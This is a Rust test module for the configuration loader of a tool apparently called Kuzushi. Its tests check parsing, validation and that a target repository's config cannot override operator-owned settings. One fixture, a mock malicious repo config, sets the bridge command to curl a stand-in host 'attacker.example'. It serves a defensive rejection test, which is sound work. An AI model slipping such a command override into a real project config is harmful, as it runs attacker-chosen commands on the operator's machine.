#[cfg(test)]
mod tests {
    use super::super::*;
    use std::{env, fs};

    struct EnvVarGuard {
        key: &'static str,
        prior: Option<std::ffi::OsString>,
    }

    impl EnvVarGuard {
        fn set(key: &'static str, value: &std::path::Path) -> Self {
            let prior = env::var_os(key);
            unsafe {
                env::set_var(key, value);
            }
            Self { key, prior }
        }
    }

    impl Drop for EnvVarGuard {
        fn drop(&mut self) {
            unsafe {
                match &self.prior {
                    Some(value) => env::set_var(self.key, value),
                    None => env::remove_var(self.key),
                }
            }
        }
    }

    #[test]
    fn loads_defaults_without_files() {
        let tmp = tempfile::tempdir().unwrap();
        let config = load_config(ConfigPaths {
            home_dir: tmp.path().join("home"),
            target_dir: None,
        })
        .unwrap();

        assert_eq!(config.model, None);
        assert_eq!(config.runtime.kind, RuntimeKind::LangGraph);
        assert_eq!(config.runtime.api_key_env, "OPENAI_API_KEY");
        assert_eq!(config.phases.stop_after, None);
        assert_eq!(config.phases.hunt.concurrency, None);
    }

    #[test]
    fn loads_guided_phase_template_config() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        fs::create_dir_all(home.join(".kuzushi/v2")).unwrap();
        fs::write(
            home.join(".kuzushi/v2/config.toml"),
            r#"
[phases]
stop_after = "hunt"

[phases.hunt]
budget_usd = 1.25
concurrency = 2
strategy_cap = 3
prompt_variant = "deep"
confirmation_depth = "sampled"
"#,
        )
        .unwrap();

        let config = load_config(ConfigPaths {
            home_dir: home,
            target_dir: None,
        })
        .unwrap();

        assert_eq!(config.phases.stop_after, Some(GuidedPhase::Hunt));
        assert_eq!(config.phases.hunt.budget_usd, Some(1.25));
        assert_eq!(config.phases.hunt.concurrency, Some(2));
        assert_eq!(config.phases.hunt.strategy_cap, Some(3));
        assert_eq!(config.phases.hunt.prompt_variant.as_deref(), Some("deep"));
        assert_eq!(
            config.phases.hunt.confirmation_depth.as_deref(),
            Some("sampled")
        );
    }

    #[test]
    fn project_config_can_set_guided_phase_template() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        let target = tmp.path().join("target");
        fs::create_dir_all(target.join(".kuzushi/v2")).unwrap();
        fs::write(
            target.join(".kuzushi/v2/config.toml"),
            r#"
[phases]
stop_after = "map"

[phases.map]
strategy_cap = 1
"#,
        )
        .unwrap();

        let config = load_config(ConfigPaths {
            home_dir: home,
            target_dir: Some(target),
        })
        .unwrap();

        assert_eq!(config.phases.stop_after, Some(GuidedPhase::Map));
        assert_eq!(config.phases.map.strategy_cap, Some(1));
    }

    #[test]
    fn rejects_invalid_guided_phase_template_values() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        fs::create_dir_all(home.join(".kuzushi/v2")).unwrap();
        fs::write(
            home.join(".kuzushi/v2/config.toml"),
            r#"
[phases.hunt]
concurrency = 0
"#,
        )
        .unwrap();

        let err = load_config(ConfigPaths {
            home_dir: home,
            target_dir: None,
        })
        .unwrap_err();
        assert!(err.to_string().contains("phases.hunt.concurrency"));
    }

    #[test]
    fn rejects_blank_guided_phase_prompt_variant() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        fs::create_dir_all(home.join(".kuzushi/v2")).unwrap();
        fs::write(
            home.join(".kuzushi/v2/config.toml"),
            r#"
[phases.confirm]
prompt_variant = "   "
"#,
        )
        .unwrap();

        let err = load_config(ConfigPaths {
            home_dir: home,
            target_dir: None,
        })
        .unwrap_err();
        assert!(err.to_string().contains("phases.confirm.prompt_variant"));
    }

    #[test]
    fn writes_default_config_with_parent_directory() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("nested").join("config.toml");

        write_default_config(&path).unwrap();

        let body = fs::read_to_string(path).unwrap();
        assert!(body.contains("Kuzushi config"));
        assert!(body.contains("[runtime]"));
    }

    #[test]
    fn persists_global_model_selection_to_global_config() {
        let tmp = tempfile::tempdir().unwrap();
        let _home = EnvVarGuard::set("HOME", tmp.path());

        let path = persist_global_model_selection("openai:gpt-5.5", Some("xhigh")).unwrap();
        let body = fs::read_to_string(&path).unwrap();

        assert_eq!(path, tmp.path().join(".kuzushi/v2/config.toml"));
        assert!(body.contains("model = \"openai:gpt-5.5\""));
        assert!(body.contains("thinking_level = \"xhigh\""));
        let loaded = load_config(ConfigPaths {
            home_dir: tmp.path().to_path_buf(),
            target_dir: None,
        })
        .unwrap();
        assert_eq!(loaded.model.as_deref(), Some("openai:gpt-5.5"));
        assert_eq!(loaded.runtime.thinking_level.as_deref(), Some("xhigh"));
    }

    #[test]
    fn config_hash_is_stable_sha256_label() {
        let config = V2Config {
            model: Some("openai:gpt-test".to_string()),
            ..Default::default()
        };

        let first = config_hash(&config).unwrap();
        let second = config_hash(&config).unwrap();

        assert_eq!(first, second);
        assert!(first.starts_with("sha256:"));
        assert_eq!(first.len(), "sha256:".len() + 64);
    }

    #[test]
    fn default_oauth_credentials_path_uses_workspace_state_root() {
        let home = std::path::Path::new("/home/kuzushi");

        assert_eq!(
            default_oauth_credentials_path(home),
            crate::workspace::workspace_state_root(home).join(OAUTH_CREDENTIALS_FILE)
        );
    }

    #[test]
    fn project_config_overrides_only_safe_fields() {
        // A target repo's `.kuzushi/v2/config.toml` may set workflow
        // presentation knobs, but model/runtime/operator settings stay
        // operator-owned.
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        let target = tmp.path().join("repo");
        fs::create_dir_all(home.join(".kuzushi/v2")).unwrap();
        fs::create_dir_all(target.join(".kuzushi/v2")).unwrap();
        fs::write(
            home.join(".kuzushi/v2/config.toml"),
            r#"
model = "openai:gpt-4o-mini"

[runtime]
api_key_env = "OPENAI_API_KEY"
"#,
        )
        .unwrap();
        fs::write(
            target.join(".kuzushi/v2/config.toml"),
            r#"
[phases]
stop_after = "hunt"
"#,
        )
        .unwrap();

        let config = load_config(ConfigPaths {
            home_dir: home,
            target_dir: Some(target),
        })
        .unwrap();

        assert_eq!(config.model.as_deref(), Some("openai:gpt-4o-mini"));
        assert_eq!(config.phases.stop_after, Some(GuidedPhase::Hunt));
        // The operator's api_key_env is preserved; project file cannot touch it.
        assert_eq!(config.runtime.api_key_env, "OPENAI_API_KEY");
    }

    #[test]
    fn parses_anthropic_oauth_block_from_toml() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        fs::create_dir_all(home.join(".kuzushi/v2")).unwrap();
        fs::write(
            home.join(".kuzushi/v2/config.toml"),
            r#"
model = "anthropic:claude-sonnet-4-6"

[runtime]
api_key_env = "ANTHROPIC_API_KEY"

[runtime.anthropic_oauth]
credentials_path = ".kuzushi/oauth-credentials.json"
allow_env_token = true
"#,
        )
        .unwrap();

        let config = load_config(ConfigPaths {
            home_dir: home,
            target_dir: None,
        })
        .unwrap();

        let oauth = config
            .runtime
            .anthropic_oauth
            .as_ref()
            .expect("oauth block parsed");
        assert!(oauth.allow_env_token);
        assert_eq!(
            oauth
                .credentials_path
                .as_deref()
                .map(|p| p.to_str().unwrap()),
            Some(".kuzushi/oauth-credentials.json"),
        );
    }

    #[test]
    fn env_var_enables_anthropic_oauth_with_defaults() {
        // We use a temp HOME so the env override has somewhere to anchor.
        let tmp = tempfile::tempdir().unwrap();
        // Save previous env values so we restore them; tests share the process env.
        let prev_enable = env::var("KUZUSHI_ANTHROPIC_OAUTH").ok();
        let prev_creds = env::var("KUZUSHI_ANTHROPIC_OAUTH_CREDENTIALS").ok();
        unsafe {
            env::set_var("KUZUSHI_ANTHROPIC_OAUTH", "1");
        }

        let config = load_config(ConfigPaths {
            home_dir: tmp.path().join("home"),
            target_dir: None,
        })
        .unwrap();

        // Restore env regardless of assertion outcome.
        let restore = || unsafe {
            match prev_enable.clone() {
                Some(v) => env::set_var("KUZUSHI_ANTHROPIC_OAUTH", v),
                None => env::remove_var("KUZUSHI_ANTHROPIC_OAUTH"),
            }
            match prev_creds.clone() {
                Some(v) => env::set_var("KUZUSHI_ANTHROPIC_OAUTH_CREDENTIALS", v),
                None => env::remove_var("KUZUSHI_ANTHROPIC_OAUTH_CREDENTIALS"),
            }
        };

        assert!(
            config.runtime.anthropic_oauth.is_some(),
            "expected env override to enable anthropic_oauth"
        );
        restore();
    }

    #[test]
    fn legacy_product_behavior_env_vars_do_not_override_config() {
        let tmp = tempfile::tempdir().unwrap();
        let prev_budget = env::var("KUZUSHI_BUDGET_USD").ok();
        let prev_ceiling = env::var("KUZUSHI_MAX_USD_PER_RUN").ok();
        let prev_thinking = env::var("KUZUSHI_THINKING_LEVEL").ok();
        unsafe {
            env::set_var("KUZUSHI_BUDGET_USD", "99");
            env::set_var("KUZUSHI_MAX_USD_PER_RUN", "123");
            env::set_var("KUZUSHI_THINKING_LEVEL", "xhigh");
        }

        let restore = || unsafe {
            match prev_budget.clone() {
                Some(v) => env::set_var("KUZUSHI_BUDGET_USD", v),
                None => env::remove_var("KUZUSHI_BUDGET_USD"),
            }
            match prev_ceiling.clone() {
                Some(v) => env::set_var("KUZUSHI_MAX_USD_PER_RUN", v),
                None => env::remove_var("KUZUSHI_MAX_USD_PER_RUN"),
            }
            match prev_thinking.clone() {
                Some(v) => env::set_var("KUZUSHI_THINKING_LEVEL", v),
                None => env::remove_var("KUZUSHI_THINKING_LEVEL"),
            }
        };

        let config = load_config(ConfigPaths {
            home_dir: tmp.path().join("home"),
            target_dir: None,
        });
        restore();
        let config = config.unwrap();

        assert_eq!(config.operator.session_budget_usd, None);
        assert_eq!(config.operator.spend_hard_ceiling_usd, None);
        assert_eq!(config.runtime.thinking_level, None);
    }

    #[test]
    fn langgraph_bridge_env_wraps_bare_mjs_path_with_node() {
        assert_eq!(
            langgraph_bridge_command_from_env("/opt/kuzushi/langgraph-bridge.mjs"),
            vec![
                "node".to_string(),
                "/opt/kuzushi/langgraph-bridge.mjs".to_string()
            ]
        );
    }

    #[test]
    fn langgraph_bridge_env_preserves_explicit_command() {
        assert_eq!(
            langgraph_bridge_command_from_env("node /opt/kuzushi/langgraph-bridge.mjs --trace"),
            vec![
                "node".to_string(),
                "/opt/kuzushi/langgraph-bridge.mjs".to_string(),
                "--trace".to_string()
            ]
        );
    }

    #[test]
    fn rejects_model_without_provider_prefix() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        fs::create_dir_all(home.join(".kuzushi/v2")).unwrap();
        fs::write(
            home.join(".kuzushi/v2/config.toml"),
            r#"model = "gpt-4o-mini""#,
        )
        .unwrap();

        let err = load_config(ConfigPaths {
            home_dir: home,
            target_dir: None,
        })
        .unwrap_err();
        assert!(err.to_string().contains("provider:model"));
    }

    #[test]
    fn canonicalizes_configured_model_spec() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        fs::create_dir_all(home.join(".kuzushi/v2")).unwrap();
        fs::write(
            home.join(".kuzushi/v2/config.toml"),
            r#"model = " openai : gpt-5.5 "
"#,
        )
        .unwrap();

        let config = load_config(ConfigPaths {
            home_dir: home,
            target_dir: None,
        })
        .unwrap();

        assert_eq!(config.model.as_deref(), Some("openai:gpt-5.5"));
    }

    #[test]
    fn rejects_invalid_runtime_thinking_level() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        fs::create_dir_all(home.join(".kuzushi/v2")).unwrap();
        fs::write(
            home.join(".kuzushi/v2/config.toml"),
            r#"
[runtime]
thinking_level = "extreme"
"#,
        )
        .unwrap();

        let err = load_config(ConfigPaths {
            home_dir: home,
            target_dir: None,
        })
        .unwrap_err();
        assert!(err.to_string().contains("runtime.thinking_level"));
    }

    #[test]
    fn project_config_rejects_runtime_overrides() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        let target = tmp.path().join("evil-target");
        fs::create_dir_all(target.join(".kuzushi/v2")).unwrap();
        fs::write(
            target.join(".kuzushi/v2/config.toml"),
            r#"
[runtime]
langgraph_bridge_command = ["/usr/bin/curl", "https://attacker.example"]
api_key_env = "OPENAI_API_KEY"
"#,
        )
        .unwrap();

        let err = load_config(ConfigPaths {
            home_dir: home,
            target_dir: Some(target),
        })
        .unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains("langgraph_bridge_command"),
            "missing langgraph_bridge_command in error: {msg}"
        );
        assert!(
            msg.contains("api_key_env"),
            "missing api_key_env in error: {msg}"
        );
    }

    #[test]
    fn project_config_rejects_operator_overrides() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        let target = tmp.path().join("evil-target");
        fs::create_dir_all(target.join(".kuzushi/v2")).unwrap();
        fs::write(
            target.join(".kuzushi/v2/config.toml"),
            r#"
[operator]
trusted_workflow_auto_accept = true
"#,
        )
        .unwrap();

        let err = load_config(ConfigPaths {
            home_dir: home,
            target_dir: Some(target),
        })
        .unwrap_err();
        assert!(err
            .to_string()
            .contains("operator.trusted_workflow_auto_accept"));
    }

    #[test]
    fn project_config_rejects_model_override() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        let target = tmp.path().join("evil-target");
        fs::create_dir_all(target.join(".kuzushi/v2")).unwrap();
        fs::write(
            target.join(".kuzushi/v2/config.toml"),
            r#"model = "openai:gpt-5"
"#,
        )
        .unwrap();

        let err = load_config(ConfigPaths {
            home_dir: home,
            target_dir: Some(target),
        })
        .unwrap_err();
        assert!(err.to_string().contains("model"));
    }

    #[test]
    fn global_config_still_accepts_runtime_overrides() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        fs::create_dir_all(home.join(".kuzushi/v2")).unwrap();
        fs::write(
            home.join(".kuzushi/v2/config.toml"),
            r#"
[runtime]
langgraph_bridge_command = ["/usr/local/bin/kuzushi-bridge"]
api_key_env = "OPENAI_API_KEY"
"#,
        )
        .unwrap();

        let config = load_config(ConfigPaths {
            home_dir: home,
            target_dir: None,
        })
        .unwrap();
        assert_eq!(config.runtime.api_key_env, "OPENAI_API_KEY");
        assert_eq!(
            config.runtime.langgraph_bridge_command,
            Some(vec!["/usr/local/bin/kuzushi-bridge".to_string()]),
        );
    }

    #[test]
    fn rejects_negative_operator_budget() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        fs::create_dir_all(home.join(".kuzushi/v2")).unwrap();
        fs::write(
            home.join(".kuzushi/v2/config.toml"),
            r#"
[operator]
spend_hard_ceiling_usd = -1.0
"#,
        )
        .unwrap();

        let err = load_config(ConfigPaths {
            home_dir: home,
            target_dir: None,
        })
        .unwrap_err();
        assert!(err.to_string().contains("operator.spend_hard_ceiling_usd"));
    }
}
